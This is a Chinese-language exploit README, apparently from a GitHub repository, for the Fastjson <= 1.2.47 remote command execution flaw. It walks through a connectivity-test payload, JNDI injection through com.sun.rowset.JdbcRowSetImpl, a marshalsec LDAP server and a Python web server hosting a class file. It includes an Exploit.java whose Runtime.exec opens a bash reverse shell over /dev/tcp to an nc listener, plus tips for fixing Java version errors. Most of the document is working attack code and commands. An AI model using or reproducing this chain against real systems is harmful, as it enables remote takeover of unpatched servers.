# fastjson-1.2.47-RCE
Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法

### 0x00 环境
以下操作均在CentOS7下亲测可用，openjdk需要切换到8，且使用8的javac
```
> java -version
openjdk version "1.8.0_252"
OpenJDK Runtime Environment (build 1.8.0_252-b09)
OpenJDK 64-Bit Server VM (build 25.252-b09, mixed mode)

> javac -version
javac 1.8.0_252
```

### 0x01 连通性测试

准备一台公网ip服务器监听流量
```
nc -lvvp port1
```

发送Payload，将IP改为公网服务器IP
```
POST / HTTP/1.1
Host: 10.11.1.201:8090
Content-Type: application/json
Content-Length: 172


{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"http://ip:port1",
        "autoCommit":true
    }
}

```

如果监听服务器有流量，可以继续下一步

### 0x02 准备LDAP（或rmi）服务和Web服务
#### github：
```https://github.com/TplusSs/fastjson-1.2.47-RCE-exp```


将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下（公网服务器）

在当前目录下启动LDAP服务,修改IP为公网服务器的IP
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP/#Exploit port2
```

在当前目录下启动Web服务
```
python2 -m http.server port3 或者 python2 -m SimpleHTTPServer port3
```

### 0x03 修改Exploit.java并编译成class文件

修改Exploit.java，此处以反弹shell为例：
```
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/ip/port1 0>&1");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
```

使用javac编译Exploit.java，生成Exploit.class文件（注意：javac版本最好与目标服务器接近，否则目标服务器无法解析class文件，会报错）
```
javac Exploit.java
```

### 0x04 Check

检查一下，现在目录应该有三个文件
```
marshalsec-0.0.3-SNAPSHOT-all.jar
Exploit.java
Exploit.class
```

服务器已经开启LDAP和Web服务
```
LDAP Server：Listening on 0.0.0.0:port2
Web  Server：Serving HTTP on 0.0.0.0 port3 (http://0.0.0.0:Port3/) ...
```

一个nc正在准备接收反弹回来的SHELL
```
nc -lvvp port1
```

### 0x05 执行
修改ip为正在运行LDAP和Web服务的服务器IP
```
POST / HTTP/1.1
Host: 10.11.1.201:8090
Content-Type: application/json
Content-Length: 172


{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://iP:port2/Exploit",
        "autoCommit":true
    }
}
```

接下来如果没有任何报错的话，LDAP将会把请求Redirect到Web服务，Fastjson将会下载Exploit.class，并解析运行

你的LDAP服务和Web服务都会收到请求记录，如果没有问题，你的nc也会收到反弹回来的SHELL


### 0x05 问题

当javac版本和目标服务器差太多，会报一个下面那样的错误，所以需要使用1.8的javac来编译Exploit.java
```
Caused by: java.lang.UnsupportedClassVersionError: Exploit has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
```

当运行LDAP的服务器java版本过高，会无法运行LDAP服务，虽然显示正在Listening，但是Fastjson的JNDI会报错，显示无法获取到资源，所以要使用java 1.8（openjdk 8）来运行LDAP服务
